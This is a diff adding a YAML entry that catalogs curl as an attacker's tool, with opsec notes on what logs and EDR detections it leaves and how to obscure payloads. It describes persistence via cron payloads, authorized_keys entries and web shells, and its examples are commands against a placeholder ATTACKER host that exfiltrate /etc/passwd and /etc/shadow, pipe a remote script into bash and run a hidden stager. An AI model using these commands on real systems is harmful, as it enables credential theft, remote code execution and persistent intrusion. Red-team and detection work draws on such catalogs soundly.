@@ -1,0 +1,73 @@
+name: curl
+
+capabilities:
+  - read
+  - download
+  - upload
+  - exec
+
+required_permissions:
+  level: user
+  notes: "No elevated permissions needed. SUID curl is rare but critical if present."
+
+difficulty: low
+
+opsec:
+  noise: medium
+  artifacts:
+    - "Shell history (~/.bash_history, ~/.zsh_history)"
+    - "Proxy/firewall logs for outbound HTTP/HTTPS"
+    - "/var/log/auth.log if curl used to pull and execute"
+  notes: >
+    Outbound HTTP(S) is logged by most enterprise proxies and EDRs with TLS
+    inspection. Prefer HTTPS to obscure payload content, but assume the
+    destination IP/domain is visible. Piping to sh/bash will trigger most
+    modern AV/EDR heuristics.
+
+persistence_potential: true
+persistence_notes: >
+  Curl can download a cron payload, authorized_keys entry, or web shell and
+  write it in place if write permissions allow. Combine with a write-capable
+  binary for persistence chains.
+
+examples:
+  - id: download-file
+    description: "Fetch a remote file to disk."
+    capabilities: [download]
+    command: |
+      curl https://ATTACKER/file -o /tmp/file
+
+  - id: read-local-file
+    description: "Read a local file and send it to a remote server."
+    capabilities: [read, upload]
+    command: |
+      curl --data @/etc/passwd https://ATTACKER/collect
+
+  - id: exec-remote-payload
+    description: "Fetch and execute a remote shell script in memory."
+    capabilities: [exec, download]
+    command: |
+      curl https://ATTACKER/payload.sh | bash
+    notes: "Triggers pipe-to-shell detection on most EDRs. Use with caution."
+
+  - id: reverse-shell-via-exec
+    description: "Reverse shell using /dev/tcp after fetching stager."
+    capabilities: [exec, reverse-shell]
+    command: |
+      curl -s https://ATTACKER/stager.sh -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s
+
+  - id: upload-exfil
+    description: "POST a file to a listener (e.g., netcat HTTP server)."
+    capabilities: [upload, read]
+    command: |
+      curl -F "f=@/etc/shadow" http://ATTACKER:8080/
+
+references:
+  - "https://gtfobins.github.io/gtfobins/curl/"
+  - "https://curl.se/docs/manpage.html"
+
+tags:
+  - http
+  - exfil
+  - stager
+  - file-transfer
